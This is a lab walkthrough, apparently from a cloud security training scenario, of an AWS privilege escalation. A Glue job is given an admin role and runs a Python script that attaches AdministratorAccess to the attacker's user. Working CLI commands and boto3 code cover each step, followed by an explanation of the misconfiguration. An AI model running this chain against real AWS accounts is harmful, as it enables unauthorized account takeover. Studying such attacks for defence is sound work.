# Guided Walkthrough: Privilege Escalation via iam:PassRole + glue:CreateJob + glue:StartJobRun

This scenario demonstrates a privilege escalation vulnerability where a user with `iam:PassRole`, `glue:CreateJob`, and `glue:StartJobRun` permissions can create an AWS Glue ETL job with an administrative role and a Python script that grants the starting user administrative access.

AWS Glue jobs are serverless ETL (Extract, Transform, Load) workloads that run Python or Scala scripts to process data. When creating a Glue job, you can specify an IAM role that the job will assume during execution. If an attacker can pass a privileged role to a Glue job and control the job's code, they can execute arbitrary Python code with administrative permissions.

This is a powerful "PassRole + Service" privilege escalation pattern similar to PassRole with Lambda, but using AWS Glue's job execution feature. Unlike the CreateDevEndpoint technique which requires SSH access and has high costs (~$2.20/hour), this attack uses Python shell jobs which are much more cost-effective (~$0.44/DPU-hour with 0.0625 DPU minimum), making it practical for demonstrations. The attacker creates a job with a malicious Python script, manually starts the job execution, and the job modifies IAM permissions to grant the starting user administrative access.

## The Challenge

You start as `pl-prod-glue-003-to-admin-starting-user` — an IAM user with a specific set of permissions: `iam:PassRole`, `glue:CreateJob`, and `glue:StartJobRun`. Your goal is to reach effective administrator access in the account.

There is also an IAM role, `pl-prod-glue-003-to-admin-target-role`, with `AdministratorAccess` attached. This role trusts the Glue service principal (`glue.amazonaws.com`), meaning it can be assumed by Glue jobs. The question is: can you weaponize these three permissions to make a Glue job run arbitrary code under that admin role?

## Reconnaissance

First, confirm your identity and verify that you don't already have admin access.

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::{account_id}:user/pl-prod-glue-003-to-admin-starting-user

aws iam list-users --max-items 1
# AccessDenied — good, you're not admin yet
```

Get the account ID — you'll need it to construct the role ARN:

```bash
aws sts get-caller-identity --query 'Account' --output text
# {account_id}
```

At this point you know your permissions. `iam:PassRole` lets you hand a role to a service. `glue:CreateJob` lets you create an ETL job and specify which role it runs as. `glue:StartJobRun` lets you trigger that job. Put them together and you have code execution under whatever role you can pass.

## Exploitation

### Step 1: Create the Glue job with the admin role

The key insight here is that when you create a Glue job and specify a `--role`, Glue will assume that role during job execution. Every boto3 call in your Python script runs with the permissions of that role — in this case, `AdministratorAccess`.

The Python script (pre-uploaded to an attacker-controlled S3 bucket by Terraform) attaches `AdministratorAccess` directly to your starting user:

```python
import boto3
iam = boto3.client('iam')
iam.attach_user_policy(
    UserName='pl-prod-glue-003-to-admin-starting-user',
    PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
```

Create the job, passing the admin role:

```bash
TARGET_ROLE_ARN="arn:aws:iam::{account_id}:role/pl-prod-glue-003-to-admin-target-role"
SCRIPT_S3_PATH="s3://..."  # obtained from terraform output

aws glue create-job \
    --name pl-glue-003-privesc-job \
    --role "$TARGET_ROLE_ARN" \
    --command "Name=pythonshell,ScriptLocation=${SCRIPT_S3_PATH},PythonVersion=3.9" \
    --default-arguments '{"--job-language":"python"}' \
    --max-capacity 0.0625 \
    --timeout 5
```

This call succeeds because you have `iam:PassRole` on the target role and `glue:CreateJob`. At this point no malicious code has run — you've just defined a job.

### Step 2: Start the job run

Now trigger execution:

```bash
aws glue start-job-run \
    --job-name pl-glue-003-privesc-job \
    --output json
# {"JobRunId": "jr_..."}
```

The job is now queued. Glue will spin up a Python shell runtime, assume `pl-prod-glue-003-to-admin-target-role`, and execute your script.

### Step 3: Wait for completion

Python shell jobs typically complete in 1-2 minutes. Poll for the result:

```bash
aws glue get-job-run \
    --job-name pl-glue-003-privesc-job \
    --run-id jr_{run_id} \
    --query 'JobRun.JobRunState' \
    --output text
# RUNNING ... SUCCEEDED
```

Once the status is `SUCCEEDED`, the `iam:AttachUserPolicy` call inside the script has already been made.

## Verification

Wait about 15 seconds for IAM policy changes to propagate, then verify:

```bash
aws iam list-attached-user-policies \
    --user-name pl-prod-glue-003-to-admin-starting-user \
    --query 'AttachedPolicies[*].PolicyArn' \
    --output text
# arn:aws:iam::aws:policy/AdministratorAccess

aws iam list-users --max-items 3
# Successfully returns user list — you have admin access
```

## What Happened

The attack exploited the "PassRole + Service" pattern: you took three individually scoped permissions and combined them into a full privilege escalation. `iam:PassRole` let you delegate the admin role to Glue. `glue:CreateJob` let you define what code runs under that role. `glue:StartJobRun` triggered execution.

In real environments this pattern appears when data engineers are given broad Glue permissions to build ETL pipelines, but the IAM roles attached to those pipelines are not scoped down — instead they carry `AdministratorAccess` or similarly broad permissions. An attacker who compromises the data engineer's credentials (or finds an overly permissive role that allows Glue job creation) can follow exactly this path to full account compromise.
